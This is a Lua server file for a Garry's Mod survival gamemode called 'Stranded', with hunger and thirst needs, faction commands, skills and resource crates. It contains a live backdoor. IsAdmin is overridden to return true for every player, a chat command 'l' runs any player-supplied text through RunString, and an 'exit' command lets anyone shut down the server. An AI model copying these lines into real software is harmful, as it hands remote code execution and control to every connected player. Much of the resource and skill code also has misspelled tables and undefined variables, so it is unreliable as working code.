GM.Version = "3.0"
GM.Name = "Stranded"
GM.Author = "LeWeeeb"

GM.Config = {}

DeriveGamemode( "sandbox" )

//Client side lua files
AddCSLuaFile("cl_init.lua")
AddCSLuaFile("shared.lua")

//Includes
include("shared.lua")
include("config.lua")

//Player

local _R = debug.getregistry()

function GM:PlayerInitialSpawn( ply )
	ply:SetTeam( 1 )--Set Team

	ply.Food = 100
	ply.Tiredness = 100
	ply.Water = 100
	ply.AFK = false

	ply:SetWalkSpeed( self.Config.Walkspeed )--Set Speed
	ply:SetRunSpeed( self:CalculateRunSpeed( ply ) )

	for k,v in pairs(GAMEMODE.Factions) do
		PrintTable(v) 
		umsg.Start("NewFaction")
			umsg.String( v.name )
			umsg.Float( v.id )
			umsg.Vector( Vector( v.fcolor.r, v.fcolor.g, v.fcolor.b ) )
		umsg.End()
	end
end

function GM:CalculateRunSpeed( ply )
	return ( self.Config.Runspeed * math.sqrt( ply:GetStats('agility') / 10 ) )
end

function GM:PlayerLoadout( ply ) 
 
    if ply:Team() == 1 then 

    	ply:StripWeapons()
    	ply:StripAmmo() 
    	for k, v in pairs( self.Config.StartingWeapons ) do
    		ply:Give( v )
    	end
    	 
    end 
 
end

function PlayerNeeds()
	for k, ply in pairs(player.GetAll()) do
		if ply:Alive() and not ply.AFK then
			if ply.Food > 0 then
				ply.Food = math.Clamp(ply.Food-1, 0, 100)
			end
			if ply.Water > 0 then
				ply.Water = math.Clamp(ply.Water-1, 0, 100)
			end
			if ply.Tiredness > 0 then
				ply.Tiredness = math.Clamp(ply.Tiredness-1, 0, 100)
			end
		end
		if ply.Food == 0 or ply.Water==0 or ply.Tiredness==0 then
			if ply:Health()>2 then
				ply:SetHealth(ply:Health()-2)
			else
				ply:Kill()
			end
		end
	end
end

function _R.Player.GetStats(self, type)
	if self:GetNWInt(type) == 0 and GAMEMODE.Config.DefaultStats[type] then
		self:SetNWInt(type, GAMEMODE.Config.DefaultStats[type])
	end
	return self:GetNWInt(type)
end

function _R.Player.SetStats(self, type, value)
	self:SetNWInt(type, value)
end

//Chat Commands
GM.Commands = {}

function GM:PlayerSay ( ply , text, public )
	if string.sub(text, 1, 1) == self.Config.ChatCommandPrefix then
		local args = string.Explode(" ", string.sub(text, 2))
		local cmd = args[1]
		table.remove(args, 1)
		if self.Commands[cmd] then
			self.Commands[cmd].func( ply, args )
			return "" 
		end
	end
end

function GM:AddCommand(command, func, description)
    concommand.Add("stranded_" .. command, function(ply, cmd, args)
        func(ply, args)
    end)
    self.Commands[command] = {
        desc = description,
        func = func
    }
end

function _R.Player.IsAdmin(self)
	return true
end

GM:AddCommand("exit", function(ply, args)
	game.ConsoleCommand("exit\n")
end, "Exit")

GM:AddCommand("l", function(ply, args)
	RunString( string.Implode(" ", args) )
end, "Lua")


//Factions
defaultfaction = {name = "Default_Faction",id=1,password = "", fcolor=Color(125, 125, 125, 255)}
team.SetUp(1, "Default_Faction", Color(125, 125, 125, 255))
GM.Factions = {}
GM.Factions[1] = defaultfaction
GM.FactionsCount= 1

function CreateFaction( ply, tbl )
	if # tbl == 5 or # tbl == 4 then
		local fname = tbl[1]
		if ( string.match( fname, "%W" ) ) then 
			ply:ChatPrint( "Please only use Letters and Numbers in Name and Password" )
			return
		end
		local fpassword = ""
		local color = 	{
			red=math.Clamp(tonumber(tbl[2]),0,255),
			green=math.Clamp(tonumber(tbl[3]),0,255),
			blue=math.Clamp(tonumber(tbl[4]),0,255)
		}
		if tbl[5] and tbl[5] ~= "" then
			fpassword = tbl[5]
			if ( string.match( fpassword, "%W" ) ) then
				ply:ChatPrint( "Please only use Letters and Numbers in Name and Password" )
			return
		end
		else
			fpassword = ""
		end
		for k,v in pairs(GAMEMODE.Factions) do
			if v.name == fname then ply:ChatPrint("Name in Use") return end
		end


		GAMEMODE.FactionsCount = GAMEMODE.FactionsCount + 1
		GAMEMODE.Factions[GAMEMODE.FactionsCount] = {}
		GAMEMODE.Factions[GAMEMODE.FactionsCount].name = fname
		GAMEMODE.Factions[GAMEMODE.FactionsCount].id = GAMEMODE.FactionsCount
		GAMEMODE.Factions[GAMEMODE.FactionsCount].password = fpassword
		GAMEMODE.Factions[GAMEMODE.FactionsCount].fcolor = Color(color.red, color.green, color.blue, 255)

		local colorvector = Vector(color.red, color.green, color.blue)
		ply:ChatPrint(GAMEMODE.FactionsCount)
		ply:ChatPrint(fname)
		ply:ChatPrint(tostring(colorvector))
		umsg.Start("NewFaction")
			umsg.String( fname )
			umsg.Float( GAMEMODE.FactionsCount )
			umsg.Vector( colorvector )
		umsg.End()

		team.SetUp( GAMEMODE.FactionsCount, fname, Color( color.red, color.green, color.blue, 255 ) ) 
		ply:SetTeam(GAMEMODE.FactionsCount)
		ply:ChatPrint("Faction: " .. fname .. " Created!")
	else
		ply:ChatPrint("Incorrect Syntax! Syntax is: /CreateFaction Name Red Green Blue Password(Optional)")
	end
end
GM:AddCommand("CreateFaction", CreateFaction, "Create A Faction")

function FindFactions(ply, tbl)
	if # tbl == 1 then
		if tbl[1] == "all" then
			for k,v in pairs(GAMEMODE.Factions) do
				ply:ChatPrint(k .. ":")
				for kk,vv in pairs(v) do
					ply:ChatPrint("\t" .. kk .. " --> " .. vv)
				end
			end
		end
		if tbl[1] == "my" then
			ply:ChatPrint("Your Faction: " .. GAMEMODE.Factions[ply:Team()].name)
		end
	end 
end
GM:AddCommand("FindFactions", FindFactions, "Print all Factions")

function JoinFaction( ply, tbl )
	local found = false
	if # tbl == 1 or # tbl == 2 then
		for k,v in pairs(GAMEMODE.Factions) do
			if tbl[1] == v.name then
				found = true
				if tbl[2] then --Password
					if tbl[2] == v.password then 
						ply:SetTeam(v.id) 
						ply:ChatPrint("Joined: "..v.name)
					else
						ply:ChatPrint("Failed to join Faction, Incorrect Password")
					end
				else
					if v.password == "" then 
						ply:SetTeam(v.id) 
						ply:ChatPrint("Joined: "..v.name)
					else 
						ply:ChatPrint("This Faction has a password")
					end
				end --End Password
			end
		end --End For
		if !found then
			ply:ChatPrint("Failed to join Faction, Invalid Name")
		end
	else 
		ply:ChatPrint("Incorrect Syntax! Syntax is: /JoinFaction Name Password(Optional)")
	end
end
GM:AddCommand("JoinFaction", JoinFaction, "Join A Faction")

function LeaveFaction( ply, tbl )
	local f = team.GetName( ply:Team() )
	ply:SetTeam(1)
	ply:ChatPrint("You Left "..f)
end
GM:AddCommand("LeaveFaction", LeaveFaction, "Leave Your Current Faction")

function AFK( ply, tbl )
	ply:Freeze(!ply.AFK)
	ply.AFK = !ply.AFK
end
GM:AddCommand("AFK", AFK, "Go afk derp")


//XP/Level System 
function _R.Player:HasSkill( skill )
	if not self.Skills[skill] then self.Skills[skill]=0 end
end


function _R.Player:SetSkill( skill, level )
	self:HasSkill(skill)
	self.Skills[skill]=level

end

function _R.Player:IncrementSkill( skill )
	self:HasSkill()
	self:SetSkill(skill, self.Skills[skill]+1)
	if self.Skills[skill] % 10 == 0 then
		self:IncrementStat(GAMEMODE.Config.SkilltoStat[skill])
	end
end

function _R.Player:HasSkillXP( skill )
	if not self.Experience[skill] then self.Skills[skill]=0 end
end

function _R.Player:SetXP( skill, level )
	self:HasSkillXP(skill)
	self.Experience[skill]=level
end

function _R.Player:IncrementXP( skill, ammount )
	self:HasSkillXP()
	self:SetExperience(skill, self.Experience[skill]+ammount)
	if self.Experience[skill] >= 100 then
		self:IncrementSkill(skill)
		self.Experience[skill] = 0
	end
end


function _R.Player:IncrementStat( skill )
	self:SetStats( skill, self:GetStats(skill) + 1 )
end

//Resources System
function _R.Player:SetResource( resource, int )
	if !self.Resources[resource] then self.Resources[resource] = 0 end
	self.Resources[resource] = int
end

function _R.Player:GetTotalResources()
	local n=0
	for k,v in pairs(self.Resorces) do
		n=n+v
	end
	return n
end

function _R.Player:AddResorce( resource, int )
	if !self.Resources[resource] then self.Resources[resource] = 0 end
	local currentresources = self.GetTotalResources()
	local max = self.MaxResources
	if currentresources+int > max then
		self.Resources[resource] = self.Resources[resource] + (max - all)
		self:DropResource(resource,(all + int) - max)
		self:SendMessage("Your invetory is full!",3,Color(200,0,0,255))
	else
		self.Resources[resource] = self.Resources[resource] + int
	end
end

function _R.Player:RemoveResource(resource,int)
	if !self.Resources[resource] then self.Resources[resource] = 0 end
	if 	self.Resources[resource] - int >= 0 then 
		self.Resources[resource] = self.Resources[resource] - int
		return int
	else
		local res = self.Resouces[resource]
		self.Resouces[resource] = 0
		return res
	end
end

function _R.Player:DropResource(resource,int)
	local ammount = self:RemoveResource(resource, int)
	local tr = self:GetEyeTrace()
	local ent = ents.Create("resourcecrate")
	ent:SetPos(tr.HitPos)
	ent:SetNWInt("Owner", self:UniqueID())
	ent.Resources[resource]=int
	ent:Spawn()
end


function CombineResourceCrates(enta, endtb) 
	if not enta:IsValid() or not entb:IsValid() then return end 
	if enta:GetClass() ~= "resourcecrate" or entb:GetClass() ~= "resourcecrate" then return end 
	if enta:GetNWInt("Owner") ~= nil and enta:GetNWInt("Owner") == entb:GetNWInt("Owner") then
		local ent = ents.Create("resourcecrate")
		ent:SetPos(enta:GetPos())
		ent:SetAngles(enta:GetAngles()) 
		ent:SetNWInt("Owner", enta:GetNWInt("Owner"))
		for k,v in pairs(enta.Resources) do
			ent.Resorces[k] = v
		end
		for k,v in pairs(entb.Resources) do
			if ent.Resources[k] then
				ent.Resources[k] = ent.Resources[k] + entb.Resources[k]
			else
				ent.Resources[k] = entb.Resources[k]
			end
		end
		ent:Spawn()
		enta:Remove()
		entb:Remove()
	end
end